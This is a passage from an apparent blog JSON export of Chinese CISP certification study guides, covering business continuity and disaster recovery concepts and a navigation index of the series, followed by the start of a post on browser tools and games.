验证可行性：确保计划在实际情况下可行 发现问题：及早发现计划中的缺陷 培训人员：让恢复团队熟悉流程 优化流程：通过测试改进恢复流程 未测试的后果： 🔴 灾难性服务中断（最严重） 计划无法执行 业务无法恢复 造成重大损失 🟡 资源高消耗 恢复过程混乱 资源浪费 成本超支 🟡 恢复成本无法最小化 未优化的流程 效率低下 额外开支 🟡 实施问题 用户和恢复团队不熟悉流程 协调困难 延误恢复 测试重点 1. 数据备份验证 💾 数据是恢复的基础没有数据处理，所有的恢复努力都是徒劳的。数据备份的及时性和异地存储是最重要的审查内容。 数据备份检查清单： ✅ 备份频率 是否按计划执行 频率是否满足RPO要求 是否有自动化监控 ✅ 备份完整性 备份是否完整 是否可以成功恢复 定期进行恢复测试 ✅ 异地存储 备份是否存储在安全的异地位置 存储地点是否安全 是否有多个备份副本 ✅ 恢复测试 定期测试数据恢复 验证恢复时间 确保数据可用性 其他重要因素： 虽然以下因素也很重要，但数据备份是基础： 热站的建立和有效性 业务连续性手册的有效性和更新 保险责任范围和保费 2. 人员安全优先 👥 人的生命最重要在对业务持续性计划进行验证时，人员安全计划部署是最为重要的。业务持续性计划最重要的要素就是保护人的生命，应当优先于计划的其他方面。 人员安全考虑： 紧急疏散 明确的疏散路线 定期疏散演练 集合点设置 人员通知 紧急联系机制 多渠道通知方式 人员状态确认 安全保障 人身安全优先于资产保护 不要求员工冒险抢救设备 提供必要的安全培训 优先级排序： 🔴 人员安全（最高优先级） 🟡 数据备份 🟡 备份站点可用性 🟢 保险覆盖 3. 业务连续性手册验证 手册检查要点： ✅ 内容有效性 信息是否准确 流程是否可行 联系方式是否最新 ✅ 更新及时性 是否定期更新 是否反映最新变化 版本控制是否清晰 ✅ 可访问性 关键人员是否可以获取 是否有多个副本 是否有电子和纸质版本 灾难恢复能力等级 灾难恢复资源程度分级 📊 灾难恢复能力等级依据具备的灾难恢复资源程度的不同，灾难恢复能力分为6个等级（不是7个等级）。 灾难恢复能力等级体系： graph TB A[\"灾难恢复能力等级\"] B[\"第0级：无备份\"] C[\"第1级：数据备份\"] D[\"第2级：备份站点支持\"] E[\"第3级：电子传输和设备支持\"] F[\"第4级：业务连续性\"] G[\"第5级：实时数据同步\"] A --> B A --> C A --> D A --> E A --> F A --> G B --> B1[\"无任何准备\"] C --> C1[\"定期备份\"] D --> D1[\"冷站/温站\"] E --> E1[\"热站准备\"] F --> F1[\"业务可快速恢复\"] G --> G1[\"零数据丢失\"] style B fill:#ffcdd2,stroke:#c62828 style C fill:#fff9c4,stroke:#f57c00 style D fill:#ffe0b2,stroke:#e65100 style E fill:#c5e1a5,stroke:#558b2f style F fill:#a5d6a7,stroke:#2e7d32 style G fill:#81c784,stroke:#1b5e20 六个等级详解： 等级 名称 特征 RTO RPO 成本 第0级 无备份 无任何灾难恢复准备 不确定 全部丢失 无 第1级 数据备份 定期数据备份，异地存储 天-周 天 低 第2级 备份站点支持 冷站或温站 天 天 中低 第3级 电子传输和设备支持 热站，电子数据传输 小时 小时 中高 第4级 业务连续性 热站，自动切换 小时 分钟 高 第5级 实时数据同步 双活数据中心 分钟 秒/零 很高 等级对应的备份站点类型： 第0级：无备份站点 第1级：数据备份，无备份站点 第2级：冷站 第3级：温站或热站（手动切换） 第4级：热站（自动切换） 第5级：镜像站点/双活数据中心 ⚠️ 常见误区错误：灾难恢复能力分为7个等级 ✅ 正确：分为6个等级（第0级到第5级） 可能的混淆来源： 有些标准可能有不同的分级方式 但主流的灾难恢复能力分级是6个等级 从第0级（无备份）到第5级（实时同步） 等级选择建议： 业务类型 推荐等级 原因 关键金融交易 第5级 不能容忍数据丢失 重要业务系统 第4级 需要快速恢复 一般业务系统 第3级 平衡成本和恢复能力 非关键系统 第2级 成本优先 归档系统 第1级 只需数据保护 关键知识点总结 数据备份 按数据类型分类： ✅ 系统数据备份：操作系统、应用程序、配置 ✅ 用户数据备份：业务数据、用户文件 按备份方式分类： ✅ 完全备份：所有数据 ✅ 差异备份：自上次完全备份后的所有变化 ✅ 增量备份：自上次任何备份后的变化 关键理解： ❌ 增量备份不是从上次完全备份后的变化 ✅ 增量备份是从上次任何备份后的变化 ✅ 差异备份才是从上次完全备份后的所有变化 容灾演练： ✅ 必须定期进行，不能因为系统稳定就停止 ✅ 验证计划有效性 ✅ 保持团队熟练度 ✅ 发现潜在问题 灾难恢复能力等级： ✅ 分为6个等级（第0级到第5级） ❌ 不是7个等级 ✅ 从无备份到实时同步 备份站点 站点类型 设施 设备 数据同步 恢复时间 成本 RTO 冷站 ✅ 电力、空调、地板 ❌ ❌ 最长 最低 天级 温站 ✅ ✅ 部分（UPS、备份设备） ❌ 中等 中等 小时级 热站/镜像 ✅ ✅ 完整 ✅ 实时 最短 最高 分钟级 BCP核心特性 ✅ 防止：防火墙、访问控制等预防措施 ✅ 减轻：周期性备份、数据复制、冗余系统 ✅ 恢复：热站切换、业务恢复、系统重建 恢复优先级 ✅ 最高优先级：恢复关键流程 ✅ 中等优先级：恢复敏感流程（可手工执行） ✅ 低优先级：站点恢复和重新部署 灾难恢复计划制定 ✅ 首要步骤：执行业务影响分析（BIA） ✅ BIA首要任务：根据恢复优先级设定重要业务流程 ✅ 策略制定首要评估：可实现的成本效益和内置复原恢复时间 ✅ 优先级定义：由业务经理负责 ✅ 关键系统识别：在灾难前完成 ✅ 恢复策略：根据BIA识别的风险水平和危险程度制定 恢复策略选择 ✅ 热站使用条件：低灾难容忍度、低RTO、低RPO ✅ 数据镜像使用条件：低RPO（恢复点目标） ✅ 灾难容忍度：业务能承诺不使用IT设备的时间间隔 ✅ 策略匹配：根据灾难容忍度、RTO、RPO选择合适策略 RTO与成本关系 ✅ RTO增加 → 灾难容忍度增加、恢复成本降低 ✅ 成本考虑：停机成本 + 恢复操作成本 ✅ 间接成本：往往比直接成本更重要，可能威胁业务生存 ✅ 最佳策略：在停机成本和恢复成本之间找到平衡点 互惠协议与备份站点共享 ✅ 最大风险：软硬件不兼容导致无法使用对方设施 ✅ 资源可用性：内在风险但可通过契约管理 ✅ 演练问题：可通过纸上推演或协商解决 ✅ 安全差异：不是不可避免的风险 关键数据库恢复 ✅ 最佳策略：实时复制到异地 ✅ 地理保护：两个单独区域同时更新 ✅ 数据完整性：零数据丢失（RPO=0） ✅ 本地方案局限：无法防护数据中心级灾难 高可用性网络设计 ✅ 最高风险：网络服务器位于同一地点 ✅ 降低风险：设备地理分散、不同路由、热站就绪 ✅ 单点故障：同地点部署导致整个网络脆弱 分布式环境容错 ✅ 服务器集群：最大程度减轻服务器故障影响 ✅ 冗余路径：针对通信中断，非服务器故障 ✅ 拨号备份：针对通信中断，非服务器故障 ✅ 备份电源：针对电源故障，非服务器故障 数据传输与保护 ✅ 关键交易系统：必须实时传送到区域外 ✅ 非实时方案：无法保证所有交易的有效性 ✅ 数据备份：及时性和异地存储是基础 业务连续性测试 ✅ 最重要审查：数据备份的及时性和异地存储 ✅ 最高优先级：人员安全计划 ✅ 未测试风险：灾难性服务中断 ✅ 定期测试：验证计划可行性 易错点提醒 ⚠️ 常见误区备份站点选址： ❌ 为便于访问而选择靠近主站点的位置 ✅ 应保持适当距离，避免同一灾难影响 安全标准： ❌ 备份站点可以降低安全标准 ✅ 应与主站点保持相同的安全等级 优先级定义： ❌ 由IT部门决定系统优先级 ✅ 由业务经理根据业务影响定义 计划制定顺序： ❌ 先制定恢复策略再做业务影响分析 ✅ 先做业务影响分析再制定恢复策略 测试重点： ❌ 只关注技术恢复能力 ✅ 人员安全是最高优先级 成本分析： ❌ 只考虑停机成本或只考虑恢复成本 ✅ 必须同时考虑两者并寻找平衡点 间接成本： ❌ 可以忽略间接停机成本 ✅ 间接成本往往比直接成本更重要 数据传输： ❌ 每小时或每天传送就足够了 ✅ 关键交易系统必须实时传送 BCP特性： ❌ 混淆防止、减轻、恢复的概念 ✅ 备份是减轻措施，不是防止或恢复 恢复优先级： ❌ 先恢复站点再恢复业务 ✅ 先恢复关键流程，站点恢复优先级低 策略选择： ❌ 高灾难容忍度使用热站 ✅ 低灾难容忍度才需要热站 RPO理解： ❌ 混淆RTO和RPO ✅ RPO关注数据丢失，低RPO需要数据镜像 互惠协议： ❌ 认为资源可用性是最大风险 ✅ 软硬件不兼容是最大风险 数据库恢复： ❌ 本地镜像或备份足够 ✅ 必须实时复制到异地才能完整恢复 网络高可用性： ❌ 认为同地点部署没问题 ✅ 同地点是单点故障，风险最高 容错方案： ❌ 混淆各种容错方案的针对对象 ✅ 服务器集群针对服务器故障，冗余路径针对通信 实践建议 组织层面 定期评估 每年至少进行一次业务影响分析 根据业务变化更新恢复计划 定期审查备份站点的适用性 持续测试 制定年度测试计划 包括桌面演练和实际演练 记录测试结果并改进 人员培训 定期培训恢复团队 确保关键人员了解自己的职责 进行应急响应演练 个人层面 理解原理 不要死记硬背答案 理解每种方案的优缺点 能够根据场景选择合适方案 系统思考 考虑不同类型的灾难场景 评估各种恢复方案的适用性 理解成本与效益的平衡 实践应用 结合实际工作经验理解概念 思考自己组织的业务连续性计划 识别潜在的改进机会 备考要点 高频考点 ✅ 冷站、温站、热站的区别 ✅ 备份站点的选址原则 ✅ 备份站点的安全要求 ✅ BCP的三个核心特性：防止、减轻、恢复 ✅ 周期性备份属于减轻措施 ✅ 恢复关键流程具有最高优先级 ✅ 敏感流程可在更长时间内手工恢复 ✅ 站点恢复和重新部署优先级较低 ✅ 互惠协议面临的最大风险：软硬件不兼容 ✅ 关键数据库完整恢复：实时复制到异地 ✅ 高可用性网络最高风险：服务器同一地点 ✅ 服务器集群减轻服务器故障影响 ✅ 业务影响分析的重要性和执行顺序 ✅ 业务经理在优先级定义中的角色 ✅ 制定恢复策略时首要评估的因素 ✅ BIA对恢复策略选择的影响 ✅ 灾难容忍度的定义和影响 ✅ 低灾难容忍度需要热站 ✅ 低RPO需要数据镜像 ✅ RTO、RPO与恢复策略的匹配 ✅ RTO与灾难容忍度、成本的关系 ✅ 停机成本和恢复操作成本的平衡 ✅ 直接成本与间接成本的区别 ✅ 实时数据传输的重要性 ✅ 数据备份的重要性 ✅ 人员安全的优先级 ✅ 未测试计划的风险 答题技巧 识别关键词 “最重要”、“首先”、&quot;最佳&quot;等 注意问题是关于技术方案还是管理流程 场景分析 理解业务场景描述 考虑不同故障类型的影响 选择最全面的解决方案 优先级判断 人员安全 &gt; 数据保护 &gt; 系统恢复 业务影响分析 &gt; 恢复策略制定 测试验证 &gt; 文档编制 总结 业务连续性管理与灾难恢复是确保组织在面临灾难时能够持续运营的关键。通过理解备份站点类型、掌握灾难恢复计划制定流程、重视业务连续性测试，可以建立有效的业务连续性管理体系。 🎯 核心要点 BCP特性：包含防止、减轻、恢复三个核心特性，周期性备份属于减轻措施 恢复优先级：关键流程最高，敏感流程其次，站点恢复优先级低 互惠协议：最大风险是软硬件不兼容，需定期同步技术路线 数据库恢复：关键数据库必须实时复制到异地，本地方案无法防护数据中心灾难 网络高可用：服务器同地点是最高风险，需地理分散和冗余路径 容错设计：服务器集群针对服务器故障，冗余路径针对通信故障 备份站点：根据灾难容忍度和RTO选择，低容忍度用热站 数据保护：低RPO需要数据镜像，关键交易系统必须实时传输 恢复计划：从BIA开始，首先识别关键业务流程优先级 成本平衡：同时考虑停机成本和恢复成本，重视间接成本 测试验证：数据备份是基础，人员安全是最高优先级 持续改进：定期测试、评估和更新计划 相关学习资源： CISP学习指南：知识体系导航与学习路线图 业务连续性管理国际标准 ISO 22301","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：知识体系导航与学习路线图","slug":"2025/10/CISP-Knowledge-System-Navigation-zh-CN","date":"un44fin44","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Knowledge-System-Navigation/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Knowledge-System-Navigation/","excerpt":"CISP认证考试完整知识体系导航，涵盖管理与组织、风险与业务连续性、技术安全等七大核心领域的学习路线图。","text":"注册信息安全专业人员（CISP）认证是中国信息安全领域的权威认证之一。本系列学习指南专注于&quot;基本安全管理措施&quot;这一核心知识体，帮助考生系统地理解和掌握关键概念。 知识体系概览 基本安全管理措施主要包含七大核心领域： graph LR A[\"基本安全管理措施\"] B[\"管理与组织\"] C[\"风险与业务连续性\"] D[\"技术安全\"] E[\"网络与系统\"] F[\"数据与资产\"] G[\"软件与开发\"] H[\"物理与环境\"] I[\"合规与框架\"] A --> B A --> C A --> D A --> E A --> F A --> G A --> H A --> I B --> B1[\"安全组织机构\"] B --> B2[\"安全策略\"] B --> B3[\"信息安全管理组织\"] B --> B4[\"人员安全管理\"] B --> B5[\"职业道德\"] C --> C1[\"风险管理与威胁建模\"] C --> C2[\"业务连续性与应急响应\"] D --> D1[\"访问控制与身份鉴别\"] D --> D2[\"密码学与PKI\"] E --> E1[\"网络安全基础\"] E --> E2[\"系统安全与取证\"] E --> E3[\"恶意代码防护\"] F --> F1[\"资产管理\"] F --> F2[\"数据库安全\"] G --> G1[\"软件安全与SAMM\"] G --> G2[\"软件测试与安全\"] H --> H1[\"物理与环境安全\"] I --> I1[\"等级保护与框架\"] style A fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style B fill:#f3e5f5,stroke:#7b1fa2 style C fill:#fff9c4,stroke:#f57f17 style D fill:#e8f5e9,stroke:#388e3d style E fill:#e1f5fe,stroke:#0277bd style F fill:#e0f2f1,stroke:#00695c style G fill:#fff3e0,stroke:#f57c00 style H fill:#fce4ec,stroke:#c2185b style I fill:#ede7f6,stroke:#5e35b1 系列文章导航 📋 管理与组织领域 🏢 安全组织机构 CISP学习指南：安全组织机构 人员风险评估、职责分离原则、关键角色职责 📜 安全策略 CISP学习指南：安全策略 文件层次结构、策略关键要素、评审机制、管理者承诺 🤝 信息安全管理组织 CISP学习指南：信息安全管理组织 组织结构设计、保密协议管理、外部关系管理、外部访问控制 👥 人员安全管理 CISP学习指南：人员安全管理 生命周期管理、离职控制、补偿性控制措施 🎓 职业道德 CISP学习指南：职业道德 五大核心原则、法律法规遵守、职业操守维护、持续专业发展 📋 项目管理 CISP学习指南：项目管理基础 项目定义与特征、SMART原则 项目理解常见错误、信息安全项目管理 🎯 风险与业务连续性领域 📊 风险管理与威胁建模 CISP学习指南：风险管理 风险管理基础、风险评估方法、风险处理策略 CISP学习指南：风险管理、威胁建模与安全设计 背景建立、风险评估、风险处理、风险监控 风险要素关系、风险值计算方法、多威胁多脆弱性场景 STRIDE威胁建模六类威胁、安全设计原则 🔄 业务连续性与应急响应 CISP学习指南：业务连续性管理与灾难恢复 备份站点类型（冷/温/热站）、灾难恢复计划、业务连续性测试 RPO和RTO概念、业务影响分析 CISP学习指南：信息安全事件管理与应急响应 事件响应六阶段、PDCERF方法论 通知机制、应急响应团队、我国事件分级（特别重大/重大/较大/一般） CISP学习指南：应急响应PDCERF方法论 PDCERF六阶段详解、准备与检测、遏制与根除、恢复与跟踪 🔐 技术安全领域 🔐 信息安全基础 CISP学习指南：信息安全CIA三要素 CIA三要素（保密性、完整性、可用性） 安全威胁对CIA的影响、安全措施与CIA的关系 CISP学习指南：Windows操作系统安全配置 Windows本地安全策略四大类别、安全配置分类 密码策略、账户锁定策略、审核策略配置 LSA与SID、SAM服务权限、远程登录鉴别机制演进 🔒 访问控制与身份鉴别 CISP学习指南：访问控制 安全模型分类、BLP与Biba模型、访问控制实现 ACL与CL区别、主体与客体概念 访问控制实施步骤（主体→实施部件→客体→决策部件） CISP学习指南：访问控制机制、蜜网、审计系统与WAPI TACACS+集中式访问控制、蜜网功能与局限 审计系统三大组成（日志记录、分析、报告） WAPI安全机制（WAI身份鉴别、WPI数据加密） CISP学习指南：身份鉴别方法 实体所知、实体所有、实体特征三大类鉴别方法 指纹鉴别、生物识别、多因素认证 🔐 密码学与PKI CISP学习指南：密码学与安全 密码系统组成、密钥安全、攻击面降低、密钥管理生命周期 对称加密与非对称加密、MD5与AES区别 密码学发展历史四阶段（古典→近代→现代早期→现代近期） CISP学习指南：PKI与数字证书 PKI核心组件、RA与CA区别、证书生命周期 数字签名、证书撤销机制 🌐 网络与系统安全领域 🌐 网络安全基础 CISP学习指南：网络基础知识 TCP/IP协议体系、OSI七层模型、TCP/IP封装过程 威胁分类、私有IP地址、NAT技术 CISP学习指南：通信与操作安全 威胁识别、介质销毁方法、网络可用性提升 链路冗余、IPsec VPN安全服务、防火墙隔离 CISP学习指南：通信与操作安全扩展 安全机制与协议、网络安全技术深入 CISP学习指南：安全机制与协议 安全协议分析、加密协议、认证协议 传输层安全协议（SSL/TLS）、网络层协议（IPsec）、数据链路层协议（L2TP、PP2P） 🖥️ 系统安全与取证 CISP学习指南：Linux系统安全 passwd和shadow文件、密码加密机制、SUID权限位 Linux权能机制、root账户管理、SID/RID概念 CISP学习指南：计算机取证与系统保障 计算机取证流程（获取、保护、分析） XSS攻击防护、Windows审核策略、入侵检测 CISP学习指南：入侵检测系统与法律 IDS工作原理、检测方法、法律法规要求 🦠 恶意代码防护 CISP学习指南：恶意代码传播方式 即时通讯传播、电子邮件传播、网络蠕虫 移动存储介质、网页挂马、社会工程学 木马防护措施、病毒应急响应 🔍 渗透测试 CISP学习指南：渗透测试与安全技术 渗透测试方法论、测试流程、工具使用 漏洞发现与利用、安全评估技术 💾 数据与资产安全领域 📦 资产管理 CISP学习指南：资产管理 资产分类、责任人管理、敏感性管理、安全标记 🗄️ 数据库安全 CISP学习指南：数据库安全 六大安全策略、粒度适当策略、访问控制机制 🏗️ 软件与开发安全领域 💻 软件安全与SAMM CISP学习指南：软件安全 BSI模型、软件安全三大支柱、SDL模型 安全测试与软件安全接触点 CISP学习指南：软件安全与SAMM模型 SAMM四大核心业务功能（治理、构建、验证、运营） 成熟度模型、软件安全保障 🔬 软件测试与安全 CISP学习指南：软件测试与安全 模糊测试（Fuzzing）原理、测试用例生成 测试对象选择、异常监测、结果分析 CISP学习指南：Web软件安全 Web应用安全威胁、OWASP Top 10、安全开发实践 🏢 物理与环境安全领域 🏢 物理与环境安全 CISP学习指南：物理与环境安全 数据中心选址、物理访问控制、消防安全、电源保护 🏛️ 合规与框架领域 🏛️ 等级保护与框架 CISP学习指南：信息安全等级保护基础 核心政策文件、等级保护五个等级、测评体系 IATF框架与深度防御、安全培训管理、CC标准 CISP学习指南：信息安全管理体系与标准 信息安全工程理念、ISMS PDCA模型 等级保护发展历程（思想→试点→政策→标准→法律） P2DR模型四个强调 CISP学习指南：信息安全事件与风险管理 信息安全事件分级、国家秘密定级 IPsec协议安全、密钥管理、风险处理方式 CISP学习指南：保密法与威胁建模 防火墙隔离能力、应急响应预案 威胁建模流程、保密法与国家秘密保护 CISP学习指南：系统工程、密码算法与标准 系统工程特点（整体性、综合性）、系统工程方法 分组密码算法、标准体系与层级关系、SSE-CMM能力成熟度模型 国务院信息化办公室九项重点工作 CISP学习指南：安全框架IATF与SABSA IATF框架结构、SABSA企业安全架构 框架应用与实践、安全架构设计 PDCA循环 graph TB P[\"Plan计划分析问题、制定目标\"] D[\"Do执行实施计划内容\"] C[\"Check检查评估执行结果\"] A[\"Act处理总结改进\"] P --> D D --> C C --> A A -.\"持续改进\".-> P style P fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style D fill:#e8f5e9,stroke:#388e3d,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style A fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px PDCA循环是管理学常用的持续改进模型，包含计划（Plan）、执行（Do）、检查（Check）、处理（Act）四个阶段。 详细内容请参考： CISP学习指南：信息安全管理体系与标准 - ISMS的PDCA模型 学习建议 学习顺序 建议按照以下顺序学习： 安全组织机构 → 理解基础概念和原则 安全策略 → 掌握策略体系和管理要求 信息安全管理组织 → 了解组织运作和外部关系 人员安全管理 → 深入人员管理实践 业务连续性管理与灾难恢复 → 掌握业务连续性保障 学习方法 💡 高效学习策略理解优先于记忆 不要死记硬背答案，要理解背后的安全原理和管理逻辑。 推荐学习步骤： 理解概念：先理解每个概念的定义和目的 分析原理：思考为什么要这样设计 联系实际：结合实际工作场景理解 系统归纳：建立知识体系框架 交叉复习：各领域知识相互关联 高频考点 跨领域重点： ✅ 职责分离原则及其应用 ✅ 安全策略文件的层次结构 ✅ 风险管理流程与阶段划分 ✅ 备份站点类型与选择（冷/温/热站） ✅ 业务连续性和灾难恢复（RPO/RTO） ✅ 事件响应六阶段模型 ✅ PDCERF六阶段方法论 ✅ 访问控制模型（BLP/Biba） ✅ 密钥管理生命周期 ✅ PKI核心组件（RA与CA的区别） ✅ STRIDE威胁建模六类威胁 ✅ 软件安全三大支柱 ✅ SAMM四大核心业务功能 ✅ ISMS PDCA模型各阶段 ✅ 等级保护制度和框架 ✅ P2DR模型的四个强调 ✅ 风险值计算方法 ✅ 四种风险处理方式 ✅ 信息安全事件分级标准 ✅ 资产分类和责任人管理 ✅ CIA三要素（保密性、完整性、可用性） ✅ DDoS攻击与可用性 ✅ Windows安全策略配置 ✅ 项目管理与SMART原则 ✅ ISO 27001控制措施范围 ✅ IATF框架由美国发布 ✅ 传输层安全协议（SSL/TLS） ✅ Windows身份鉴别机制（LSA、SID、SAM） ✅ 密码学发展四阶段 ✅ 访问控制实施流程四要素 ✅ TACACS+集中式访问控制机制 ✅ 蜜网功能（吸引、监控、分析，不能实时报警） ✅ 审计系统三大组成（日志记录、分析、报告） ✅ WAPI安全机制（WAI、WPI） ✅ 国务院信息化办公室九项重点工作 ✅ 系统工程特点（整体性、综合性） 易错点提醒 ⚠️ 注意区分 当前员工 vs 离职员工：当前员工风险更高 系统程序员 vs 系统维护员：职责不应混淆 方针政策 vs 工作程序：层次不同 必须纸质 vs 可以电子：策略文件形式灵活 固定评审周期 vs 灵活评审：应根据组织实际情况 BLP vs Biba：上读下写 vs 下读上写 ACL vs CL：以资源为中心 vs 以用户为中心 定量 vs 定性风险分析：各有优势，应根据实际选择 安全测试 vs 软件安全接触点：安全测试是软件安全接触点的一部分 高层职责 vs 执行职责：战略决策 vs 日常运营 专职 vs 兼职：根据条件灵活配置 保密协议内容：关注保密相关要素，非业务细节 外部访问管理：平衡安全与业务需求 冷站 vs 温站 vs 热站：设备配置和恢复能力不同 备份站点距离：不能太近也不能太远 优先级定义者：业务经理而非IT经理 计划制定顺序：业务影响分析必须在前 背景建立 vs 风险评估：背景建立不包括资产识别并赋值 粒度最小 vs 粒度适当：是适当策略，不是最小策略 最小粒度 vs 适当粒度：根据实际选择，不是一味追求最小 职业道德违规：散发非法软件违反职业道德 资产分类：操作系统属于平台资产，不是设备资产 资产责任人：必须明确所有者、管理者、使用者，厂商不是责任人 敏感性标识：个人签名不属于敏感性标识方法 介质销毁：物理破坏是最有效方法 网络可用性：链路冗余最能提高可用性 密码安全：安全性由密钥决定，不是算法 攻击面降低：限制访问而非关闭功能 数据中心选址：中间楼层最适合，避开一楼、地下室、顶楼 消防系统：哈龙气体或干管系统最适合数据中心 事件响应：准备→确认→遏制→根除→恢复→跟踪 应急通知：电话方式最有效，日常运行小组第一个通知 病毒响应：首先拔掉网线隔离 事件分级：特别重大、重大、较大、一般四级 SAMM核心功能：四个核心功能，购置不是其中之一 RA vs CA：RA不能签发证书，只能验证身份 PDCERF阶段：检测不是培训、文档或报告阶段 取证工作：包括获取、保护和分析三方面 RPO vs RTO：RPO关注数据丢失，RTO关注停机时间 XSS攻击：插入恶意HTML代码或脚本 Linux权能：权能只能被放弃，不能被恢复 MD5 vs AES：MD5用于完整性验证，AES用于加密 TCP/IP封装：传输层→互联网络层→网络接口层 风险降低：根据风险建立保护要求，构建防护措施 SID RID：500=Administrator，501=Guest STRIDE Spoofing：弱口令导致身份冒充属于Spoofing威胁 木马防护：使用共享文件夹是无效的防护措施 应急响应：六阶段不能保证100%成功 纵深防御：多层次防护，不依赖单一措施 CC标准先进性：实用性不是先进性的体现 信息安全工程：不能先实施后加固，必须同步建设 ISMS内部审核：属于Check阶段，不是Act阶段 ISO 27001控制领域：规划与ISMS不是控制领域 等级保护发展：正确顺序是思想→试点→政策→标准→法律 P2DR vs PDR：P2DR强调控制和对抗、动态性、漏洞监测 事件分类：数据删除属于信息破坏事件，不是有害程序事件 事件定级：综合考虑影响范围、程度和社会影响 国家秘密定级：不能由单位自行参考后报批，必须由指定部门确定 保密法三同步：保密设施必须与涉密系统同步规划、建设、运行 IPsec安全服务：不仅仅是认证和保密，还有完整性和防重放 ISMS方针制定：由管理层制定，不是IT部门 会话密钥：不能重用，会影响通信安全 关闭服务：属于风险规避，不是风险降低 防火墙隔离：只能逻辑隔离，不能物理隔离 应急预案：不是所有单位的强制要求 威胁vs漏洞：威胁不等于漏洞，威胁利用漏洞 SSL vs IPsec vs L2TP：SSL属于传输层，IPsec属于网络层，L2TP属于数据链路层 LSA vs SAM：LSA生成SID，SAM服务以SYSTEM权限运行（不是Administrator） SID组成：包括用户和组的安全描述，但不是48比特身份特权 Enigma密码机：属于近代密码阶段（机械/机电设备），不是古典密码 访问控制流程：主体→访问控制实施→客体→访问控制决策 系统工程：强调整体性，不是分解为独立部分 27号文：总体纲领是最重大意义，方针和总体要求是内容 信息系统安全保障模型：包括保障要素、生命周期和安全特征 威胁建模：威胁是潜在事件，不等于漏洞 访问权限：拒绝访问是结果，不是权限类型 主体和客体：主体主动发起访问，客体被动接受访问 TACACS+ vs RADIUS：都是集中式访问控制，不是分布式 蜜网功能：不能实时报警，这是IDS的功能 审计系统作用：不能实时阻断访问，这是访问控制的功能 WAI vs WPI：WAI负责身份鉴别，WPI负责数据加密 残余风险：不追求最小值，追求可接受水平 风险值计算：每个威胁-脆弱性组合计算一个风险值 Linux root账户：不能禁用所有ID=0用户，root必须保留 Windows审核策略：应该开启，不是关闭 模糊测试：模拟异常输入，不是正常输入 应急响应方法论：六阶段不包括准备和检测 事件分级：I级最严重，IV级最轻 PDR vs P2DR：PDR是三要素，P2DR是四要素 风险计算：多威胁多脆弱性需要分别计算 风险评估形式：应以自评估为主，不是检查评估为主 入侵检测功能：不能防止IP地址欺骗 Linux SUID：s在user的x位表示SUID，执行时具有文件所有者权限 PDCA中的A：A是Act（处理），不是Aim（瞄准） 风险管理阶段：威胁识别并赋值属于风险评估阶段，不是背景建立 DDoS攻击：主要破坏可用性，不破坏保密性和完整性 Windows安全配置：配置本地安全策略属于制定安全策略 项目结束日期：应在规划时确定，不是随机决定 ISO 27001控制领域：业务安全性审计不属于控制措施范围 IATF框架：由美国国家安全局（NSA）发布 九项重点工作：不包括&quot;提高信息技术产品的国产化率&quot; 系统工程：强调整体性，不是分别独立研究 备考建议 答题技巧 选择题解题思路： 排除法：先排除明显错误的选项 关键词法：注意问题中的&quot;最&quot;、“主要”、&quot;不正确&quot;等关键词 原理法：回归基本安全原理进行判断 场景法：将选项代入实际场景验证 时间管理 📊 快速浏览全卷，了解问题分布 ⏱️ 先做有把握的问题 🤔 预留时间检查不确定的问题 ✏️ 标记需要回顾的问题 总结 基本安全管理措施是CISP考试的重要组成部分，涵盖了信息安全管理的核心概念。通过系统学习这七大领域的知识，不仅有助于通过考试，更重要的是能够在实际工作中建立有效的安全管理体系。 🎯 学习目标 理解安全管理的基本原理 掌握各领域的核心概念 建立完整的知识体系 能够应用于实际工作 祝各位考生顺利通过CISP认证考试！ 相关资源： CISP官方网站 信息安全管理体系标准","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"工具、遊戲與瀏覽器內建 AI 遊樂場","slug":"2025/10/Tools-Games-And-Browser-Built-In-AI-zh-TW","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-TW/2025/10/Tools-Games-And-Browser-Built-In-AI/","permalink":"https://neo01.com/zh-TW/2025/10/Tools-Games-And-Browser-Built-In-AI/","excerpt":"探索實用開發工具、3D 遊戲與 Chrome 內建 AI 的強大功能。無需伺服器,完全在瀏覽器中執行的 AI 助手正在改變網頁開發。","text":"數位環境正以驚人的速度演進，而我們這個簡單的部落格剛剛實現了一次量子躍進。從一個簡單的想法集合，轉變為一個全面的數位工具包，利用瀏覽器內建 AI 的尖端力量、實用的開發者工具和引人入勝的互動遊戲。 🛠️ 真正重要的工具 工具 區塊代表了多年來開發者挫折感的精華。我們都經歷過——需要快速轉換文字大小寫、驗證 JSON 或計算檔案權限，卻發現自己淹沒在充滿廣告的臃腫線上工具中。 我們精選的集合涵蓋六個重要類別： 文字處理 – 從具有 LLM 代幣估算的全面文字統計到 ASCII 藝術產生和 NATO 字母轉換。這些不僅僅是實用工具；它們是生產力倍增器。 編碼與格式化 – Base64 轉換、URL 編碼、HTML 實體處理和具有進階格式化選項的 JSON 驗證。簡潔、快速且可靠。 安全與分析 – 具有七種不同演算法的加密雜湊和真正有意義的 URL 解析工具。 系統管理 – Chmod 計算器、crontab 產生器和系統管理員會立即加入書籤的 IPv4 子網路計算器。 檔案分析 – 我們的皇冠寶石：具有拖放功能的 PNG 中繼資料檢查器和 EXIF 提取器。上傳影像並發現其隱藏的秘密——從相機設定到嵌入的中繼資料。 實用工具 – 溫度轉換器、世界時鐘、裝置資訊，甚至還有為那些用流程圖思考的人準備的 Mermaid 圖表編輯器。 每個工具都是以簡單和有效性的理念建構的。無需註冊，無需資料收集，只有純粹的功能性。 🎮 引人入勝且具挑戰性的遊戲 遊戲 區塊對於科技部落格來說可能看起來是個奇怪的補充，但這種瘋狂是有方法的。這些不僅僅是浪費時間的東西；它們是當 AI 協助人類創造力時可能實現的展示。 我們的旗艦遊戲 立體四子棋 